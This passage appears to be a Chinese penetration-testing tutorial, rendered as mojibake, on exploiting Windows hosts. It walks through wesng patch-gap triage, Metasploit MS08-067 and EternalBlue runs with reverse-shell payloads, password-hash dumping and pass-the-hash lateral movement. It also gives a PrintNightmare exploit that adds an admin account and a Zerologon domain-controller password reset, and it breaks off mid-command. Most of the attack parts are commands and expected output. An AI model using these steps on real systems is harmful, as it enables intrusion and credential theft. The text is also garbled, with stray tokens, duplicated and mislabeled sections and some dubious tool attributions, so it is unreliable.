#### 5Ô∏è‚É£ Â∞áÊ™îÊ°àÂÇ≥Âõû Linux ÊîªÊìäÊ©üÂô® (ÊàñËÄÖ‰ΩøÁî®ÂÖ∂‰ªñÊñá‰ª∂‰∏äÂÇ≥ÊñπÊ≥ï)

```bash
scp user@victim_ip:C:\Temp\systeminfo.txt .
scp user@victim_ip:C:\Temp\qfe.txt .
```

ÊàñËÄÖÈÄèÈÅé `meterpreter download` ÊãâÂõû‰æÜ„ÄÇ

***

#### 6Ô∏è‚É£ ÈñãÂßãÊô∫ÊÖßÂàÜÊûê

```bash
cd wesng
python3 wes.py systeminfo.txt > wes_output.txt
```

üîé ÁÇ∫‰ªÄÈ∫ºÈÄôÊ®£ÂÅöÔºü

* `wesng` Ëá™ÂãïÊ†πÊìö `systeminfo.txt` ÊØîÂ∞çÂá∫„ÄåÂèØÂà©Áî®ÊºèÊ¥û + Exploit URL + Áº∫Â§± KB„Äç

***

#### 7Ô∏è‚É£ Ëá™ÂãïÂåñ‰∫§ÂèâÊØîÂ∞çÔºöÁº∫ KB ÁöÑÁ¢∫Ë™ç

```bash
grep -oP 'KB\d+' wes_output.txt | sort -u > kb_list.txt
for kb in $(cat kb_list.txt); do grep $kb qfe.txt || echo "$kb Áº∫Â§±ÔºåÂèØ‰ª•Âà©Áî®"; done > final_missing_kb.txt
```

‚úÖ **ÁµêÊûúÁØÑ‰æãÔºàfinal\_missing\_kb.txtÔºâÔºö**

```
KB4493467 Áº∫Â§±ÔºåÂèØ‰ª•Âà©Áî®
KB3143141 Â∑≤ÂÆâË£ù
KB3045171 Áº∫Â§±ÔºåÂèØ‰ª•Âà©Áî®
```

***

### 8Ô∏è‚É£ Áî¢Âá∫ÊúÄÁµÇÊèêÊ¨äÂæÖËæ¶Ê∏ÖÂñÆ

```bash
cat wes_output.txt | grep -E "CVE-|Exploit:" > final_exploit_list.txt
paste final_exploit_list.txt final_missing_kb.txt > ready_to_attack.txt
```

ÊúÄÂæåÂ∞±ÂèØ‰ª•ÊâìÈñã `ready_to_attack.txt`ÔºåÁúãÂà∞Ôºö

```
CVE-2019-0803 | Exploit: https://www.exploit-db.com/exploits/47689 | KB4493467 Áº∫Â§±ÔºåÂèØ‰ª•Âà©Áî®
CVE-2016-0099 | Exploit: https://www.exploit-db.com/exploits/40049 | KB3143141 Â∑≤ÂÆâË£ù
```

#### ‚úÖ Á≥ªÁµ±ÊºèÊ¥ûÂ∞çÁÖßË°® (Windows XP \~ Windows 11)

| ÊºèÊ¥û‰ª£Á¢º                                     | XP           | 2003 | Vista | 2008 | 7 | 2008R2 | 8 | 8.1 | 2012 | 2012R2 | 10 | 2016 | 2019 | 10 | 11 | ÂÇôË®ª                                       |
| ---------------------------------------- | ------------ | ---- | ----- | ---- | - | ------ | - | --- | ---- | ------ | -- | ---- | ---- | -- | -- | ---------------------------------------- |
| **MS08-067**                             | ‚óè            | ‚óè    |       |      |   |        |   |     |      |        |    |      |      |    |    | Server Service RPC ÈÅ†Á´ØÂü∑Ë°åÊºèÊ¥ûÔºåÊ∞∏ÊÅÜËóçÂü∫Á§é          |
| **MS17-010**                             |              |      |       |      | ‚óè | ‚óè      | ‚óè | ‚óè   | ‚óè    | ‚óè      | ‚óè  | ‚óè    | ‚óè    | ‚óè  | ‚óè  | EternalBlue SMBv1 ÈÅ†Á´ØÂü∑Ë°åÊºèÊ¥û                 |
| **CVE-2017-0213**                        |              |      |       |      | ‚óè | ‚óè      | ‚óè | ‚óè   | ‚óè    | ‚óè      | ‚óè  | ‚óè    | ‚óè    | ‚óè  | ‚óè  | COM ËÅöÂêàÂ∞ÅÈÄÅÊºèÊ¥û                               |
| **Hot Potato (Tater)**                   |              |      | ‚óè     | ‚óè    | ‚óè | ‚óè      | ‚óè | ‚óè   | ‚óè    | ‚óè      | ‚óè  | ‚óè    | ‚óè    | ‚óè  | ‚óè  | Named Pipe Ê¨äÈôêÊèêÂçáÊîªÊìä                        |
| **PrintNightmare (CVE-2021-34527)**      | IVvX5gwAhtQw |      |       |      | ‚óè | ‚óè      | ‚óè | ‚óè   | ‚óè    | ‚óè      | ‚óè  | ‚óè    | ‚óè    | ‚óè  | ‚óè  | Print Spooler È©ÖÂãïÊ¨äÈôêÊèêÂçáÊºèÊ¥ûÔºå‰ªª‰ΩïË™çË≠âÂ∏≥Êà∂ÂèØ SYSTEM    |
| **CVE-2020-1472 (Zerologon)**            |              |      |       |      |   |        |   |     | ‚óè    | ‚óè      | ‚óè  | ‚óè    | ‚óè    | ‚óè  |    | Á∂≤ÂüüÊéßÂà∂Âô® Netlogon Ê¨äÈôêÊèêÂçáÊºèÊ¥û                    |
| **HiveNightmare (CVE-2021-36934)**       |              |      |       |      |   |        |   |     |      |        | ‚óè  | ‚óè    | ‚óè    | ‚óè  | ‚óè  | SAM ÂèØËÆÄÂèñÊºèÊ¥ûÔºåÂèØÊú¨Âú∞ÊèêÂèñÂØÜÁ¢º hash                   |
| CVE-2021-34527 PrintNightmare            |              |      |       |      | ‚óè |        |   |     |      | ‚óè      |    | ‚óè    |      | ‚óè  |    |                                          |
| **Follina (CVE-2022-30190)**             |              |      |       |      |   |        |   |     |      |        | ‚óè  | ‚óè    | ‚óè    | ‚óè  | ‚óè  | Office Word/Excel 0-dayÔºåÈÄèÈÅé msdt URI ÈÅ†Á´ØÂü∑Ë°å |
| **PetitPotam (CVE-2021-36942)**          |              |      |       |      |   |        |   |     | ‚óè    | ‚óè      | ‚óè  | ‚óè    | ‚óè    | ‚óè  | ‚óè  | Âº∑Ëø´ NTLM relay ÁµêÂêà AD CS ÂèñÂæó SYSTEM Ê¨äÈôê      |
| **CVE-2022-21999**                       |              |      |       |      |   |        |   |     |      |        | ‚óè  | ‚óè    | ‚óè    | ‚óè  | ‚óè  | Print Spooler Êú¨Âú∞Ê¨äÈôêÊèêÂçá                     |
| **CVE-2023-28252**                       |              |      |       |      |   |        |   |     |      |        | ‚óè  | ‚óè    | ‚óè    | ‚óè  | ‚óè  | Win32k Âà©Áî®ÊºèÊ¥û (APT Âú®ÈáéÂà©Áî®ÔºåÂΩ±Èüø 10/11 Ëàá Server) |
| **CVE-2023-23397**                       |              |      |       |      |   |        |   |     |      |        | ‚óè  | ‚óè    | ‚óè    | ‚óè  | ‚óè  | Outlook NTLM ÊèêÂâçÊ¥©ÊºèÊÜëË≠âÊºèÊ¥û (APT ÊîªÊìäÁúüÂØ¶‰ΩøÁî®)       |
| **CVE-2023-24880**                       |              |      |       |      |   |        |   |     |      |        | ‚óè  | ‚óè    | ‚óè    | ‚óè  | ‚óè  | SmartScreen ÁπûÈÅéÊºèÊ¥ûÔºàAPT Â§ßÈáèÂà©Áî®‰æÜÈÄÉÈÅøÂÅµÊ∏¨Ôºâ          |
| **CVE-2024-21410**                       |              |      |       |      |   |        |   |     | ‚óè    | ‚óè      | ‚óè  | ‚óè    | ‚óè    | ‚óè  | ‚óè  | Exchange NTLM Relay ÊîªÊìäÊºèÊ¥û                 |
| **CVE-2024-21338**                       |              |      |       |      |   |        |   |     |      |        | ‚óè  | ‚óè    | ‚óè    | ‚óè  | ‚óè  | Win32k.sys ÊèêÊ¨äÊºèÊ¥û (APT Âú®ÈáéÊîªÊìäÂ∑≤Âà©Áî®)            |
| **ProxyNotShell (CVE-2022-41040/41082)** |              |      |       |      |   |        |   |     | ‚óè    | ‚óè      | ‚óè  | ‚óè    | ‚óè    | ‚óè  | ‚óè  | Exchange ‰º∫ÊúçÂô®ÊîªÊìäÔºåÁµêÂêà PowerShell RCE         |
| **BlueKeep (CVE-2019-0708)**             | ‚óè            | ‚óè    | ‚óè     | ‚óè    | ‚óè | ‚óè      |   |     |      |        |    |      |      |    |    | RDP ÈÅ†Á´ØÂü∑Ë°åÊºèÊ¥ûÔºåÂèØËóâÁî± RDP ÂÇ≥ÈÄÅÁâπË£ΩÂ∞ÅÂåÖÂü∑Ë°å‰ª£Á¢º            |



### ‚úÖ 1Ô∏è‚É£ MS08-067 ÊîªÊìäÊµÅÁ®ã & ÊïôÂ≠∏

####

### üè¢ ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµÔºö

MS08-067 ÊòØ **Windows Server ÊúçÂãô RPC ËôïÁêÜÊºèÊ¥û**Ôºå\
ÂÖÅË®±ÊîªÊìäËÄÖÈÄèÈÅé SMB ÈÄöË®äÂü†ÔºàTCP 445ÔºâÂ∞çÊú™ÊéàÊ¨äÁ≥ªÁµ±ÈÄ≤Ë°å**ÈÅ†Á´ØÁ®ãÂºèÁ¢ºÂü∑Ë°å**ÔºàRCEÔºâ„ÄÇ\
Ê≠§ÊºèÊ¥ûÂ≠òÂú®Êñº **Windows XP„ÄÅWindows 2000„ÄÅServer 2003„ÄÅVista ‰ª•ÂèäÈÉ®ÂàÜ 2008 Á≥ªÁµ±**Ôºå\
**EternalBlue**ÔºàMS17-010ÔºâÁöÑÂâçË∫´ËàáÂü∫Á§éÔºåËá≥‰ªä‰ªçËÉΩÂú®ÈÉ®ÂàÜËàäË®≠ÂÇôÊàñÈÜ´ÁôÇ„ÄÅÂ∑•ÊéßÁ≥ªÁµ±‰∏≠ÁúãÂà∞„ÄÇ

**Â¶ÇÊûú SMB Ë¢´Èò≤ÁÅ´ÁâÜÂ∞ÅÈéñÔºåÂèØÈÄèÈÅéÂÖßÁ∂≤Ê©´Âêë„ÄÅVPN„ÄÅÊàñÁ´ØÂè£ËΩâÁôºÊñπÂºèÁπºÁ∫åÂà©Áî®„ÄÇ**

***

### üöÄ MS08-067 ÊîªÊìäÊµÅÁ®ãÂúñ (ÊñáÂ≠óÁâà)

```
1Ô∏è‚É£ Á¢∫Ë™çÁõÆÊ®ô SMB 445 ÈñãÂïü
        ‚Üì
2Ô∏è‚É£ Âà©Áî® nmap Á¢∫Ë™çÁ≥ªÁµ±ÁâàÊú¨
        ‚Üì
3Ô∏è‚É£ Â∞ãÊâæ Metasploit ‰∏≠ÁöÑ MS08-067 Ê®°ÁµÑ
        ‚Üì
4Ô∏è‚É£ Ë®≠ÂÆö RHOST„ÄÅLHOST„ÄÅPAYLOAD
        ‚Üì
5Ô∏è‚É£ Âü∑Ë°å Exploit ÂòóË©¶Ê∫¢‰Ωç
        ‚Üì
6Ô∏è‚É£ Áç≤Âèñ Meterpreter ÊàñÂèçÂêë Shell
        ‚Üì
7Ô∏è‚É£ Á¢∫Ë™çÁ≥ªÁµ±Ê¨äÈôê (NT AUTHORITY\SYSTEM)
        ‚Üì
8Ô∏è‚É£ Dump ÂìàÂ∏åÂÄº / ÈñãÂßãÊ©´ÂêëÁßªÂãï
```

***

### üë®‚Äçüè´ ÊîªÊìäÊ≠•È©üÁØÑ‰æã + Â∑•ÂÖ∑Êåá‰ª§

***

#### üîé 1Ô∏è‚É£ ÊéÉÊèèÁõÆÊ®ô

```bash
nmap -p 445 --script smb-os-discovery <ÁõÆÊ®ôIP>
```

**ÁõÆÁöÑ**ÔºöÁ¢∫Ë™çÁõÆÊ®ô SMB Â≠òÊ¥ªÔºå‰∏¶ÂèñÂæó‰ΩúÊ•≠Á≥ªÁµ±ÁâàÊú¨„ÄÇ\
üëâ Â¶ÇÊûúÈ°ØÁ§∫ÁÇ∫ **Windows 2000/XP/2003**ÔºåÊ•µÊúâÂèØËÉΩÊòìÂèó MS08-067 ÊîªÊìä„ÄÇ

***

#### üîé 2Ô∏è‚É£ Á¢∫Ë™çÊºèÊ¥ûÊòØÂê¶Â≠òÂú®

```bash
nmap -p 445 --script smb-vuln-ms08-067 <ÁõÆÊ®ôIP>
```

> ÁµêÊûúÊúÉÊèêÁ§∫ÁõÆÊ®ôÊòØÂê¶ÂèØËÉΩÂ≠òÂú®ÊºèÊ¥û„ÄÇ

***

#### ‚öí 3Ô∏è‚É£ ÂïüÁî® Metasploit

```bash
msfconsole
```

ËºâÂÖ• MS08-067 Ê®°ÁµÑÔºö

```bash
use exploit/windows/smb/ms08_067_netapi
```

***

#### ‚öô 4Ô∏è‚É£ Ë®≠ÂÆöÂèÉÊï∏

```bash
set RHOST <ÁõÆÊ®ôIP>
set LHOST <‰Ω†ÁöÑÊîªÊìäÊ©üIP>
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 4444
```

üëâ ÂèØ‰ª•Áî® `show options` Ê™¢Êü•Ë®≠ÂÆö„ÄÇ

***

#### ‚úÖ 5Ô∏è‚É£ Âü∑Ë°åÊºèÊ¥ûÂà©Áî®

```bash
exploit
```

> ÊàêÂäüÊôÇÊúÉÁúãÂà∞Ôºö

```
[*] Sending stage (73728 bytes) to <ÁõÆÊ®ôIP>
[*] Meterpreter session 1 opened (<ÊîªÊìäÊ©üIP>:4444 -> <ÁõÆÊ®ôIP>:xxxxx) at...
```

***

#### üèÅ 6Ô∏è‚É£ ÂèñÂæóÁ≥ªÁµ±Ë≥áË®ä

```bash
meterpreter > sysinfo
meterpreter > getuid
```

> ÈÄöÂ∏∏ÊúÉÈ°ØÁ§∫Ôºö

```
Server username: NT AUTHORITY\SYSTEM
```

‰ª£Ë°®Â∑≤Á∂ìÂèñÂæóÊúÄÈ´òÁ≥ªÁµ±Ê¨äÈôêÔºÅ

***

#### üóù 7Ô∏è‚É£ Dump ÂØÜÁ¢ºÂìàÂ∏å

```bash
meterpreter > hashdump
```

> ÂèñÂæóÊú¨Ê©üÂ∏≥ËôüËàáÁÆ°ÁêÜÂì°ÁöÑ NTLM ÈõúÊπäÂÄºÔºå\
> ÂèØÁî® John the Ripper / hashcat ÂòóË©¶Á†¥Ëß£„ÄÇ

***

#### üîÅ 8Ô∏è‚É£ Ê©´ÂêëÁßªÂãï

* ‰ΩøÁî® pass-the-hash / SMB relay Â∑•ÂÖ∑Ôºàex: `psexec` Ê®°ÁµÑÔºâ
* ÊéÉÊèèÂÖ∂‰ªñ‰∏ªÊ©ü‰∏¶Âà©Áî®Áõ∏ÂêåÂìàÂ∏åÊàñÂ∏≥ÂØÜ

***

### ‚úÖ 2Ô∏è‚É£ MS17-010 (EternalBlue) ÊîªÊìäÊµÅÁ®ã & ÊïôÂ≠∏

### üè¢ ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµ

MS17-010Ôºà‰øóÁ®± EternalBlueÔºâÊòØ‰∏ÄÂÄã**SMBv1 ÈÅ†Á´ØÁ®ãÂºèÁ¢ºÂü∑Ë°åÊºèÊ¥û**Ôºå\
ÊúÄÂàùÁî±ÁæéÂúã NSA ÈñãÁôºÔºåÂæåÁ∂ì„ÄåShadow Brokers„ÄçÊ¥©ÊºèÔºåË¢´ÂãíÁ¥¢ÁóÖÊØí WannaCry Âà©Áî®Â§ßË¶èÊ®°ÁàÜÁôº„ÄÇ

Ê≠§ÊºèÊ¥ûÂá∫ÁèæÂú®Ôºö

* Windows XP
* Windows 7
* Windows Server 2003 / 2008 / 2008R2
* ÈÉ®ÂàÜ Windows 8„ÄÅ10ÔºàÊó©ÊúüÁâàÊú¨Ôºâ

ÊîªÊìäËÄÖÂèØÈÄèÈÅé 445 Á´ØÂè£ÂÇ≥ÈÄÅÁâπË£ΩÂ∞ÅÂåÖÔºåÈÄ†ÊàêË®òÊÜ∂È´îÊ∫¢‰Ωç‰∏¶Âü∑Ë°å SYSTEM Ê¨äÈôêÁ®ãÂºèÁ¢º„ÄÇ\
üëâ Âç≥‰æøÊòØÂú®Â∞ÅÈñâÁ∂≤Ë∑ØÂÖßÈÉ®Áí∞Â¢ÉÔºåËã•Á≥ªÁµ±Êú™‰øÆË£úÔºåÊ•µÂÆπÊòìË¢´ÂÖßÁ∂≤Ê©´ÂêëÊîªÊìä„ÄÇ

***

### üöÄ MS17-010 EternalBlue ÊîªÊìäÊµÅÁ®ãÂúñÔºàÊñáÂ≠óÁâàÔºâ

```
1Ô∏è‚É£ Á¢∫Ë™ç 445 Á´ØÂè£ÈñãÂïü
       ‚Üì
2Ô∏è‚É£ ‰ΩøÁî® Nmap ÊéÉÊèèÁ¢∫Ë™çÊºèÊ¥û
       ‚Üì
3Ô∏è‚É£ ÂïüÂãï Metasploit MS17-010 Ê®°ÁµÑ
       ‚Üì
4Ô∏è‚É£ Ë®≠ÂÆöÁõÆÊ®ô„ÄÅLHOST„ÄÅLPORT„ÄÅPayload
       ‚Üì
5Ô∏è‚É£ ÁôºÈÄÅ Exploit Â•ó‰ª∂
       ‚Üì
6Ô∏è‚É£ ÂèñÂæó Meterpreter Shell
       ‚Üì
7Ô∏è‚É£ ÊèêÊ¨äÁÇ∫ NT AUTHORITY\SYSTEM
       ‚Üì
8Ô∏è‚É£ Dump ÂØÜÁ¢ºÈõúÊπäÔºåÈñãÂßãÊ©´ÂêëÊª≤ÈÄè
```

***

### üë®‚Äçüè´ ÊîªÊìäÊ≠•È©üÁØÑ‰æã + Êåá‰ª§Ëß£Ë™™

***

#### üîé 1Ô∏è‚É£ ÊéÉÊèèÁõÆÊ®ô SMB Â≠òÊ¥ª

```bash
nmap -p 445 <ÁõÆÊ®ôIP>
```

> Ëã•ÊúâÈñãÂïü 445 ÊúÉÁúãÂà∞ `open`ÔºåË°®Á§∫ SMB ÂèØÂà©Áî®„ÄÇ

***

#### üîé 2Ô∏è‚É£ Ê™¢Ê∏¨ÊòØÂê¶Êúâ MS17-010 ÊºèÊ¥û

```bash
nmap -p 445 --script smb-vuln-ms17-010 <ÁõÆÊ®ôIP>
```

> ÁµêÊûúÁØÑ‰æãÔºö

```
Host is likely VULNERABLE to MS17-010!
```

Ë°®Á§∫ÊºèÊ¥ûÂ≠òÂú®„ÄÇ

***

#### ‚öí 3Ô∏è‚É£ ÂïüÁî® Metasploit

```bash
msfconsole
```

ËºâÂÖ•Ê®°ÁµÑÔºö

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

***

#### ‚öô 4Ô∏è‚É£ Ë®≠ÂÆöÂèÉÊï∏

```bash
set RHOST <ÁõÆÊ®ôIP>
set LHOST <‰Ω†ÁöÑIP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LPORT 4444
```

üëâ ‰∏ã `show options` Á¢∫Ë™çË®≠ÂÆöÊ≠£Á¢∫„ÄÇ

***

#### ‚úÖ 5Ô∏è‚É£ ÁôºÂãïÊîªÊìä

```bash
exploit
```

> ÊàêÂäüÊôÇÁï´Èù¢Ôºö

```
[*] Sending stage (1188418 bytes) to <ÁõÆÊ®ôIP>
[*] Meterpreter session 1 opened (<‰Ω†ÁöÑIP>:4444 -> <ÁõÆÊ®ôIP>)
```

***

#### üèÅ 6Ô∏è‚É£ Áç≤ÂèñÁ≥ªÁµ±ÊéßÂà∂

```bash
meterpreter > getuid
```

ÊúÉÁúãÂà∞Ôºö

```
Server username: NT AUTHORITY\SYSTEM
```

Ë°®Á§∫ÂèñÂæóÊúÄÈ´òÁÆ°ÁêÜÊ¨äÈôêÔºÅ

***

#### üóù 7Ô∏è‚É£ Dump ÂìàÂ∏å

```bash
meterpreter > hashdump
```

> ÂèñÂæóÊú¨Ê©üËàáÁÆ°ÁêÜÂì°ÈõúÊπä„ÄÇ

***

#### üîÅ 8Ô∏è‚É£ Ê©´ÂêëÁßªÂãï

ÂèØÈÄèÈÅé `psexec` Ê®°ÁµÑÊê≠ÈÖç hash ÈñãÂïüÂÖ∂‰ªñÈõªËÖ¶Ôºö

```bash
bashË§áË£ΩÁ∑®ËºØuse exploit/windows/smb/psexec
set RHOST <Ê©´ÂêëÁõÆÊ®ô>
set SMBUser <Â∏≥Ëôü>
set SMBPass <ÈõúÊπä>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <‰Ω†ÁöÑIP>
exploit
```

***

### ‚úÖ 3Ô∏è‚É£ CVE-2021-36934 (HiveNightmare) Êú¨Âú∞ÊèêÊ¨äÊµÅÁ®ã

#### üè¢„ÄêCVE-2021-36934 HiveNightmare ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµ„Äë

Windows 10/11 Á≥ªÁµ±Ê¨äÈôêÈÖçÁΩÆÈåØË™§ÔºåÂ∞éËá¥ÊôÆÈÄöÁî®Êà∂ÂèØ‰ª•ËÆÄÂèñ SAM„ÄÅSYSTEM„ÄÅSECURITY HiveÔºåÂèñÂæóÊú¨Ê©üÂ∏≥Ëôü Hash ÂæåÂèØÁ†¥Ëß£ÂØÜÁ¢ºÊàñ Pass-the-HashÔºåÈÄ≤‰∏ÄÊ≠•Ê©´ÂêëÁßªÂãï„ÄÇ

***

#### üöÄ „ÄêHiveNightmare ÊîªÊìäÊµÅÁ®ãÂúñ„Äë

```
[ÂÅµÊ∏¨ÊºèÊ¥û] 
    ‚Üì
[Ê™¢Êü• SAM Ê¨äÈôê & Âç∑ÂΩ±ÂâØÊú¨]
    ‚Üì
[‰ΩøÁî® HiveNightmare PoC ÊèêÂèñ Hive]
    ‚Üì
[ÂõûÂÇ≥ÊîªÊìäÊ©üËß£Êûê Hash]
    ‚Üì
[Pass-the-Hash / Á†¥Ëß£ÂØÜÁ¢º / ÊèêÊ¨ä]
```

***

#### üë®‚Äçüè´ „ÄêHiveNightmare ÊîªÊìäÁØÑ‰æãÊ≠•È©ü„Äë

1Ô∏è‚É£ Á¢∫Ë™çÊ™îÊ°àÊ¨äÈôê

```bash
icacls c:\Windows\System32\config\SAM
```

ÁµêÊûú‰∏≠Â¶ÇÊûú `BUILTIN\Users:(I)(RX)`Ôºå‰ª£Ë°®ÊòìÂèóÊîªÊìä„ÄÇ

2Ô∏è‚É£ Ê™¢Êü•ÊòØÂê¶Â≠òÂú® Shadow Copy

```powershell
vssadmin list shadows
```

3Ô∏è‚É£ Âü∑Ë°å HiveNightmareÔºö

```powershell
.\HiveNightmare.exe
```

4Ô∏è‚É£ ‰ΩøÁî® impacket-secretsdump Ëß£Êûê HashÔºö

```bash
impacket-secretsdump -sam SAM-xxxx -system SYSTEM-xxxx -security SECURITY-xxxx local
```

5Ô∏è‚É£ Â∞á Hash crack ÊàñÁî®Êñº PTHÔºö

```bash
hashcat -m 1000 hash.txt wordlist.txt
```

***

#### üõ†Ô∏è Â∑•ÂÖ∑Êé®Ëñ¶

* HiveNightmare.exe (GitHub ÂèØ‰∏ãËºâ)
* impacket-secretsdump
* hashcat / John The Ripper

***

#### Â¶ÇÊûú‰∏çÊàêÂäü Debug ÊñπÊ≥ï

* Á¢∫Ë™çÁ≥ªÁµ±ÊòØÂê¶Êúâ Shadow Copy
* È©óË≠â SAM ÊòØÂê¶ÂèØËÆÄ
* Âü∑Ë°å PowerShell ÊòØÂê¶ÊúâË∂≥Â§†Ê¨äÈôêÔºàÂèØÂòóË©¶„Äå‰ª•Á≥ªÁµ±Ë∫´‰ªΩ„ÄçÂü∑Ë°åÔºâ



### ‚úÖ 3Ô∏è‚É£.1  CVE-2021-36934 (HiveNightmare) Êú¨Âú∞ÊèêÊ¨äÊµÅÁ®ã



### üè¢„ÄêCVE-2021-34527 PrintNightmare ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµ„Äë

ÂÖÅË®±‰ªª‰ΩïÁ∂ìÈÅéË∫´‰ªΩÈ©óË≠âÁöÑ‰ΩøÁî®ËÄÖÈÄèÈÅé RPC ÊñπÂºèÂú®ÂèóÂÆ≥Ê©üÂô®‰∏ä‰ª• SYSTEM Ê¨äÈôêÂü∑Ë°åÁ®ãÂºèÔºåÂ∏∏Ë¶ãÊîªÊìäÊâãÊ≥ïÔºöÂà©Áî® PoC Áõ¥Êé•Êñ∞Â¢ûÊú¨Âú∞ÁÆ°ÁêÜÂì°Êàñ‰∏äÂÇ≥ÊÉ°ÊÑè DLL„ÄÇ

***

#### üöÄ „ÄêPrintNightmare ÊîªÊìäÊµÅÁ®ãÂúñ„Äë

```
[Á¢∫Ë™ç Spooler Â≠òÂú®]
    ‚Üì
[ÁπûÈÅéÂü∑Ë°åÁ≠ñÁï•]
    ‚Üì
[Âü∑Ë°å PowerShell Exploit]
    ‚Üì
[ÊàêÂäüÊñ∞Â¢ûÊú¨Ê©üÁÆ°ÁêÜÂì° / Âü∑Ë°åËá™Ë®Ç DLL]
    ‚Üì
[ÂèñÂæó SYSTEM Ê¨äÈôê]
```

***

#### üë®‚Äçüè´ „ÄêPrintNightmare ÊîªÊìäÁØÑ‰æãÊ≠•È©ü„Äë

1Ô∏è‚É£ Á¢∫Ë™ç Spooler ÊòØÂê¶ÂïüÁî®Ôºö

```powershell
ls \\localhost\pipe\spoolss
```

2Ô∏è‚É£ Ë®≠ÂÆö PowerShell ÁπûÈÅéÁ≠ñÁï•Ôºö

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

3Ô∏è‚É£ ÂåØÂÖ•ÊºèÊ¥ûÊ®°ÁµÑ‰∏¶Âü∑Ë°åÔºö

```powershell
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```

4Ô∏è‚É£ È©óË≠âÊòØÂê¶ÊàêÂäüÔºö

```powershell
net user hacker
```

***

#### üõ†Ô∏è Â∑•ÂÖ∑Êé®Ëñ¶

* cube0x0 ÁöÑ PrintNightmare Exploit (GitHub)
* PowerSploit ‰∏≠ÁöÑÊ¨äÈôêÊèêÂçáÊ®°ÁµÑ
* impacket & Responder (Êê≠ÈÖçÈÄ≤Èöé NTLM Relay ÊîªÊìä)

***

#### Â¶ÇÊûú‰∏çÊàêÂäü Debug ÊñπÊ≥ï

* Á¢∫Ë™ç Print Spooler ÊòØÂê¶ÂïüÁî®
* Ê™¢Êü•Â∏≥Êà∂Ê¨äÈôêÊòØÂê¶ÂÖÅË®± SeLoadDriverPrivilege
* Âü∑Ë°åÊôÇÂ¶ÇÂá∫ÁèæÊãíÁµïÂ≠òÂèñÔºåÂèØË©¶ËëóÁî®Âè¶‰∏ÄÁâàÊú¨ PoC Êàñ‰ΩøÁî®Á≥ªÁµ±Ê¨äÈôêÂü∑Ë°å PowerShell

### ‚úÖ 5Ô∏è‚É£ CVE-2020-1472 (Zerologon) ÊîªÊìäÊµÅÁ®ã

### üè¢ ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµ

**Zerologon** ÊòØ Netlogon ÂçîÂÆö‰∏≠ÁöÑÈáçÂ§ßÊºèÊ¥û (CVE-2020-1472)Ôºå\
ÂÖÅË®±ÊîªÊìäËÄÖÈÄèÈÅéÂ∞áË∫´‰ªΩÈ©óË≠âË´ãÊ±Ç‰∏≠ÁöÑÂä†ÂØÜÂèÉÊï∏Ë®≠ÂÆöÁÇ∫ÂÖ® 0Ôºå\
Âú®‰∏çÈúÄË¶ÅÂ∏≥Êà∂ÊÜëË≠âÁöÑÊÉÖÊ≥Å‰∏ãÈáçË®≠ Windows Á∂≤ÂüüÊéßÂà∂Âô® (Domain Controller, DC) ÁöÑË®àÁÆóÊ©üÂØÜÁ¢ºÔºå\
Êé•ËëóÈÄèÈÅéË©≤ DC Â∏≥ËôüÂèñÂæóÁ∂≤ÂüüÁÆ°ÁêÜÂì° (Domain Admin) Ê¨äÈôê„ÄÇ

**ÂΩ±ÈüøÁØÑÂúçÔºö**

* Windows Server 2012/2016/2019 (Ëã•Êú™Êõ¥Êñ∞)
* Â∑≤Âä†ÂÖ•Á∂≤ÂüüÁöÑ Windows Á≥ªÁµ±

***

### üöÄ ÊîªÊìäÊµÅÁ®ãÂúñÔºàÊñáÂ≠óÁâàÔºâ

```
1Ô∏è‚É£ ÂÅµÊ∏¨ÁõÆÊ®ôÊòØÂê¶ÁÇ∫Á∂≤ÂüüÊéßÂà∂Âô® (DC)
     ‚Üì
2Ô∏è‚É£ Âà©Áî® Zerologon PoC Â∞çÁõÆÊ®ôÂü∑Ë°å Netlogon ÊîªÊìä
     ‚Üì
3Ô∏è‚É£ Â∞á DC Ê©üÂô®Â∏≥Êà∂ÂØÜÁ¢ºÈáçË®≠ (ÁΩÆÁ©∫)
     ‚Üì
4Ô∏è‚É£ ‰ΩøÁî® impacket-secretsdump Âà©Áî® DC ÊÜëË≠â
     ‚Üì
5Ô∏è‚É£ ÊãøÂà∞ÂÆåÊï¥Á∂≤ÂüüÁÆ°ÁêÜÂì° hash / ÂØÜÁ¢º
     ‚Üì
6Ô∏è‚É£ ‰ΩøÁî® Pass-the-Hash Êàñ Kerberos ticket Ê©´ÂêëÁßªÂãï
```

***

### üë®‚Äçüè´ ÊîªÊìäÊ≠•È©üÁØÑ‰æã

#### 1Ô∏è‚É£ Á¢∫Ë™çÁõÆÊ®ôÊòØÁ∂≤ÂüüÊéßÂà∂Âô®

ÂèØÈÄèÈÅé nmap Êàñ SMB Êü•Ë©¢

```bash
nmap -p 445 --script smb-enum-domains <target-ip>
```

Êàñ

```bash
rpcclient -U "" <target-ip>
```

***

#### 2Ô∏è‚É£ ‰ΩøÁî® Zerologon ÊîªÊìäÂ∑•ÂÖ∑

Ê∫ñÂÇôÂ•Ω Python PoCÔºö\
ÊúÄÂ∏∏Áî®ÁöÑÂ∑•ÂÖ∑ÊòØ [impacket](https://github.com/SecureAuthCorp/impacket) ‰∏≠ÁöÑ `zerologon_tester.py`

```bash
python3 zerologon_tester.py <dc-name> <dc-ip>
```

Ëº∏Âá∫Ëã•ÁÇ∫Ôºö

```
[+] <dc-ip> is vulnerable to Zerologon!
```

‰ª£Ë°®ÂèØ‰ª•Âà©Áî®„ÄÇ

***

#### 3Ô∏è‚É£ Âà©Áî® Zerologon ÈáçË®≠Ê©üÂô®Â∏≥Êà∂ÂØÜÁ¢º

```bash
python3 set_empty_pw.py <dc-name> <dc-ip>
```

ÊàêÂäüÊúÉÁúãÂà∞Ôºö

```
[+] Success! DC machine account password reset.
```

***

#### 4Ô∏è‚É£ Dump Âá∫Êï¥ÂÄãÁ∂≤Âüü hash

Êé•‰∏ã‰æÜ‰ΩøÁî® impacket-secretsdump Âæû DC ÂèñÂæóÂØÜÁ¢º hashÔºö

```bash
